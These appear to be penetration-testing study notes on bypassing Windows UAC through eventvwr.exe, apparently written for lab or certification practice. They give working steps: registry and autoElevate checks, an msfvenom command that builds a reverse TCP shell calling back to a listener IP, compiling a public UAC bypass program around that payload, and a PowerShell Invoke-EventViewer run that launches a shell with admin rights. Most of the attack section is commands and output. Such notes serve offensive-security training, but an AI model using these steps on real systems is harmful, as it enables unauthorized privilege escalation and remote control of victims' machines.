# UAC Bypass

# How to know if to bypass

If you run `Invoke-AllChecks` from `PowerView.ps1`, you can see the low hanging fruits. You might see output that suggests running a BypassUAC Attack like in the screenshot shown below from [this video](https://youtu.be/2NLi4wzAvTw?t=3456).

![Untitled](UAC%20Bypass%20eb0ad323265b40e3b76a92b77bd308cd/Untitled.png)

# Eventvwr.exe

This is a way to manually bypass UAC that I found from [here](https://github.com/h4cKeung/PEN200-Lab/blob/main/10.11.1.20-10.11.1.24-svcorp.com/proof.txt) 

```bash
# PE Ref: https://ivanitlearning.wordpress.com/2019/07/07/bypassing-default-uac-settings-manually/
# comfirm UAC of the system is currently on 
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System                                                                      
                                                                                                                                              
	HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System                                                                  
	    ConsentPromptBehaviorAdmin	REG_DWORD    0x5  
	    ...    

	    EnableLUA					REG_DWORD    0x1
	    ...

	    PromptOnSecureDesktop		REG_DWORD    0x1  
	    ...                                                                                                                                                                                                
	                                                                                                                                              
	HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit                                                            
	HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\UIPI

where /r C:\windows eventvwr.exe
	C:\Windows\System32\eventvwr.exe
	C:\Windows\SysWOW64\eventvwr.exe
	C:\Windows\WinSxS\amd64_eventviewersettings_31bf3856ad364e35_10.0.14393.0_none_226c43821a65c869\eventvwr.exe
	C:\Windows\WinSxS\wow64_eventviewersettings_31bf3856ad364e35_10.0.14393.0_none_2cc0edd44ec68a64\eventvwr.exe

# comfirm eventvwr.exe is set to autoElevate
strings64.exe -accepteula C:\Windows\System32\eventvwr.exe | findstr /i autoelevate
    <autoElevate>true</autoElevate>

# creat payload for getting system shell
msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp LHOST=192.168.119.124 LPORT=12345 -f exe -o shell.exe

# download payplad, modify and compile
git clone https://github.com/turbo/zero2hero.git
nano UAC_bypass.c
	# uncomment and update shell name
	GetCurrentDirectory(MAX_PATH, curPath);
	strcat(curPath, "\\shell.exe");
x86_64-w64-mingw32-gcc UAC_bypass.c -o UAC_bypass

# get system shell by running UAT_bypass.exe
```

# Invoke-EventViewer.ps1

You can see a tutorial from Offsec Live on how to do this here: [https://youtu.be/2NLi4wzAvTw?t=3610](https://youtu.be/2NLi4wzAvTw?t=3610)

[https://github.com/CsEnox/EventViewer-UACBypass](https://github.com/CsEnox/EventViewer-UACBypass)

```nasm
PS C:\Windows\Tasks> Import-Module .\Invoke-EventViewer.ps1

PS C:\Windows\Tasks> Invoke-EventViewer 
[-] Usage: Invoke-EventViewer commandhere
Example: Invoke-EventViewer cmd.exe

PS C:\Windows\Tasks> Invoke-EventViewer C:\temp\your-shell.exe
[+] Running
[1] Crafting Payload
[2] Writing Payload
[+] EventViewer Folder exists
[3] Finally, invoking eventvwr
```

This will get you a shell back with privileges as local admin